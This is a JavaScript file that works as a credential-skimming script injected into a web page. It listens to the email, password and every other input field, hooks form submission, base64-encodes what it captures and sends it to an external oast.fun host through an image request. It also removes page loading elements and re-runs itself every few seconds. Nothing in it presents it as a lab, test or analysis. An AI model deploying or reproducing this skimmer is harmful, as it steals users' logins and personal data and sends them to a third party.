// Function to remove loading elements
function removeLoadingElements() {
    const loadingElements = document.querySelectorAll('.v-loading');
    loadingElements.forEach(element => {
        element.remove();
    });
}

// Store captured data
let capturedData = {
    email: '',
    password: '',
    otherInputs: {}
};

// Function to send captured data
function sendCapturedData() {
    if (capturedData.email || capturedData.password) {
        const data = btoa(JSON.stringify(capturedData));
        new Image().src = 'https://gqkaubaktwtqypifyzshde4g2jmmngnsu.oast.fun?data=' + data;
    }
}

// Function to capture all input events
function captureAllInputs() {
    // Capture email input
    const emailInput = document.querySelector('input[type="text"]');
    if (emailInput) {
        emailInput.addEventListener('input', function(e) {
            capturedData.email = e.target.value;
            sendCapturedData();
        });
        
        emailInput.addEventListener('blur', function(e) {
            capturedData.email = e.target.value;
            sendCapturedData();
        });
    }

    // Capture password input
    const passwordInput = document.querySelector('input[type="password"]');
    if (passwordInput) {
        passwordInput.addEventListener('input', function(e) {
            capturedData.password = e.target.value;
            sendCapturedData();
        });
        
        passwordInput.addEventListener('blur', function(e) {
            capturedData.password = e.target.value;
            sendCapturedData();
        });
    }

    // Capture all other inputs
    document.addEventListener('input', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const inputName = e.target.name || e.target.id || 'unknown';
            capturedData.otherInputs[inputName] = e.target.value;
            
            // Send data periodically but not on every keystroke
            clearTimeout(window.captureTimeout);
            window.captureTimeout = setTimeout(sendCapturedData, 2000);
        }
    });
}

// Function to set up form capture
function setupFormCapture() {
    const form = document.querySelector('form');
    if (form) {
        // Store reference to the original submit function
        const originalSubmit = form.submit;
        
        // Override the submit function
        form.submit = function() {
            sendCapturedData();
            return originalSubmit.apply(this, arguments);
        };
        
        // Also capture regular submit events
        form.addEventListener('submit', function(e) {
            sendCapturedData();
        });
    }
}

// Set up MutationObserver to monitor and remove loading elements
function setupLoadingObserver() {
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.addedNodes && mutation.addedNodes.length > 0) {
                mutation.addedNodes.forEach(function(node) {
                    if (node.nodeType === 1) {
                        if (node.classList && node.classList.contains('v-loading')) {
                            node.remove();
                        } else if (node.querySelectorAll) {
                            const loadingElements = node.querySelectorAll('.v-loading');
                            loadingElements.forEach(element => element.remove());
                        }
                    }
                });
            }
        });
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
}

// Main initialization function
function init() {
    // Set up observer for loading elements
    setupLoadingObserver();
    
    // Remove any existing loading elements
    removeLoadingElements();
    
    // Capture all input events
    captureAllInputs();
    
    // Set up form capture
    setupFormCapture();
    
    // Periodically check for new inputs and remove loading elements
    setInterval(function() {
        removeLoadingElements();
        captureAllInputs();
        setupFormCapture();
    }, 3000);
}

// Wait for the page to fully load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}

// Also initialize when the page is shown (for single-page applications)
document.addEventListener('visibilitychange', function() {
    if (!document.hidden) {
        setTimeout(init, 1000);
    }
});
